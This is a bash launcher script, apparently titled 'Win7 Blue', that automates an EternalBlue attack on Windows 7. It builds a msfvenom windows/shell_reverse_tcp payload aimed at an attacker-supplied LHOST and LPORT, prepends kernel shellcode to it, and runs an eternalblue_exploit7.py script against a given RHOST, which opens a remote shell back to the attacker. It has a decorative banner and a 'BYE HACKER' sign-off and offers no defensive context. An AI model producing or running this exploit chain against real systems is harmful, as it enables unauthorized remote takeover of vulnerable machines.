#!/bin/bash

#colors
b="\033[1;37m"
r="\033[1;31m"
v="\033[1;32m"
a="\033[1;33m"
az="\033[1;34m"
nc="\e[0m"

function banner(){
           echo ""
           echo -e "$b┌═══════════════════════════════════┐"
           echo -e "$b║$az  ██╗    ██╗██╗███╗   ██╗███████╗  $b║"
           echo -e "$b║$az  ██║    ██║██║████╗  ██║╚════██║  $b║" 
           echo -e "$b║$az  ██║ █╗ ██║██║██╔██╗ ██║    ██╔╝  $b║" 
           echo -e "$b║$az  ██║███╗██║██║██║╚██╗██║   ██╔╝   $b║"  
           echo -e "$b║$az  ╚███╔███╔╝██║██║ ╚████║   ██║    $b║"
           echo -e "$b║$az   ╚══╝╚══╝ ╚═╝╚═╝  ╚═══╝   ╚═╝    $b║"   
           echo -e "$b║$az ██████╗ ██╗     ██╗   ██╗███████╗ $b║"
           echo -e "$b║$az ██╔══██╗██║     ██║   ██║██╔════╝ $b║"
           echo -e "$b║$az ██████╔╝██║     ██║   ██║█████╗   $b║"  
           echo -e "$b║$az ██╔══██╗██║     ██║   ██║██╔══╝   $b║" 
           echo -e "$b║$az ██████╔╝███████╗╚██████╔╝███████╗ $b║"
           echo -e "$b║$az ╚═════╝ ╚══════╝ ╚═════╝ ╚══════╝ $b║"
           echo -e "$b║$r  Author $b:$a grey-btw             $b║"
           echo -e "$b║$r                                    $b║"
           echo -e "$b║$r  GitHub $b:$a github.com/grey-btw  $b║"
           echo -e "$b└═══════════════════════════════════┘$b"
}

banner
echo "LHOST=$1"
echo "LPORT=$2"
echo "RHOST=$3"

rm -rf sc_x86_msf.bin
rm -rf sc_x86.bin

msfvenom -p windows/shell_reverse_tcp -f raw -o sc_x86_msf.bin EXITFUNC=thread LHOST=$1 LPORT=$2 2>/dev/null
sleep 1
cat sc_x86_kernel.bin sc_x86_msf.bin > sc_x86.bin
sleep 1
python2.7 eternalblue_exploit7.py $3 sc_x86.bin

echo ""
echo ""
echo -e "$a        |\/\/\/|"
echo -e "        |      |" 
echo -e "        |      |" 
echo -e "        | (o)(o) " 
echo -e "        C      _) "
echo -e "         | ,___|  "
echo -e "         |   /    "
echo -e "        /____\ "
echo -e "       /      \ $nc"
echo -e "$b#### $v BYE $v HACKER $b ####$nc"
echo ""
echo ""
